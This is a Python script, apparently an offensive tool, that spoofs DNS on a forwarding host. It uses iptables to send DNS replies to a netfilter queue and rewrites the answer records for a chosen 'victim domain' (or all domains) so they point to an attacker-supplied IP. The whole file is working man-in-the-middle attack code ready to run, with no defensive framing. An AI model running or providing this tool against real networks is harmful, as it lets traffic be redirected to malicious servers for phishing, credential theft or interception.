from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, TCP
import argparse
import netfilterqueue
import os

def dns_response(pkt, interface, redirected_ip, victim_domain=None, verbose=False):
    packet = IP(pkt.get_payload())
    if packet.haslayer(DNSRR):
        if verbose:
            print(f"[+] Got DNS response packet - ID: {hex(packet[DNS].id)} - qname: {packet[DNSQR].qname.decode()}")
        
        qname = packet[DNSQR].qname

        if victim_domain in qname.decode() or victim_domain is None:
            packet[DNSRR].rdata = redirected_ip

            for i in range(packet[DNS].ancount-1, 0, -1):
                del packet[DNS].an[i]

            # Deleted fields will be rebuilt automatically by Scapy with the correct value
            del packet[IP].len
            del packet[IP].chksum
            if packet.haslayer(UDP):
                del packet[UDP].len
                del packet[UDP].chksum
            '''if packet.haslayer(TCP):
                #del packet[TCP].len
                del packet[TCP].chksum'''
            pkt.set_payload(bytes(packet))
            
            if verbose:
                print("DNS packet was modified")

    pkt.accept()
    
    if packet.haslayer(DNSRR) and verbose:
        print("Packet forwarded\n")

def dns_attack(interface, redirected_ip, victim_domain=None, verbose=False):
    # Setup iptables
    #os.system("iptables -A FORWARD -j ACCEPT")
    os.system("iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0")
    os.system("iptables -I FORWARD -p udp --sport 443 -j NFQUEUE --queue-num 0")
    os.system("iptables -I FORWARD -p tcp --sport 53 -j NFQUEUE --queue-num 0")
    os.system("iptables -I FORWARD -p tcp --sport 443 -j NFQUEUE --queue-num 0") 

    queue = netfilterqueue.NetfilterQueue()

    # Bind the queue to the nfqueue subsystem, specify the callback function
    queue.bind(0, lambda pkt: dns_response(pkt, interface, redirected_ip, victim_domain, verbose))

    try:
        # Run the queue
        queue.run()
    except KeyboardInterrupt:
        print("[+] User interrupted.")
        
        # Flush iptables
        os.system("iptables -D FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0")
        os.system("iptables -D FORWARD -p udp --sport 443 -j NFQUEUE --queue-num 0")
        os.system("iptables -D FORWARD -p tcp --sport 53 -j NFQUEUE --queue-num 0")
        os.system("iptables -D FORWARD -p tcp --sport 443 -j NFQUEUE --queue-num 0") 

        queue.unbind()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('interface', help='Mandatory argument: interface')
    parser.add_argument('-v', '--verbose', action='store_true', help='Optional argument: verbose')
    parser.add_argument('-vd', '--victim-domain', metavar='DOMAIN', help='Optional argument: victim domain')
    parser.add_argument('-r', '--redirected_ip', metavar='IP', help='Optional argument: redirected ip')

    args = parser.parse_args()

    interface = args.interface
    redirected_ip = args.redirected_ip
    victim_domain = args.victim_domain
    verbose = args.verbose

    dns_attack(interface, redirected_ip, victim_domain, verbose)